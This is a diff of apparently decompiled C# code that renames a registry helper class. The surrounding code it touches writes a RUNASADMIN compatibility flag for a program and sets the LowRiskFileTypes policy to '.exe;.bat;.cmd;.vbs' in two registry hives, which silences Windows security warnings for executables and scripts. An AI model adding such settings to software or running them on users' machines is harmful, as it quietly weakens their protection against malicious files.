@@ -130,7 +130,7 @@ internal class Class24
 
 	public static int int_39 = 1;
 
-	public static int int_40 = Class66.smethod_4("RunAdmin", 0, "1");
+	public static int int_40 = WindowsRegistryHelper.smethod_4("RunAdmin", 0, "1");
 
 	[DllImport("user32.dll")]
 	public static extern short VkKeyScan(char char_0);
@@ -1801,8 +1801,8 @@ internal class Class24
 			string string_1 = "Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers";
 			string text = "RUNASADMIN";
 			string text2 = string.Empty;
-			string text3 = Class66.smethod_2(string_1, string_0, 0);
-			string text4 = Class66.smethod_2(string_1, string_0, 1);
+			string text3 = WindowsRegistryHelper.smethod_2(string_1, string_0, 0);
+			string text4 = WindowsRegistryHelper.smethod_2(string_1, string_0, 1);
 			if (text3 != text4 && text4 != string.Empty)
 			{
 				text3 = text4;
@@ -1833,8 +1833,8 @@ internal class Class24
 			{
 				text = text2;
 			}
-			Class66.smethod_11(string_1, string_0, text, "", 0);
-			Class66.smethod_11(string_1, string_0, text, "", 1);
+			WindowsRegistryHelper.smethod_11(string_1, string_0, text, "", 0);
+			WindowsRegistryHelper.smethod_11(string_1, string_0, text, "", 1);
 		}
 		catch
 		{
@@ -1845,8 +1845,8 @@ internal class Class24
 	{
 		string string_ = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations";
 		string string_2 = "LowRiskFileTypes";
-		Class66.smethod_11(string_, string_2, ".exe;.bat;.cmd;.vbs", "", 0);
-		Class66.smethod_11(string_, string_2, ".exe;.bat;.cmd;.vbs", "", 1);
+		WindowsRegistryHelper.smethod_11(string_, string_2, ".exe;.bat;.cmd;.vbs", "", 0);
+		WindowsRegistryHelper.smethod_11(string_, string_2, ".exe;.bat;.cmd;.vbs", "", 1);
 	}
 
 	public static void CreateDesktopShortcut(string shortcutName, string targetPath, string workingDirectory = null, int locationOption = 1)
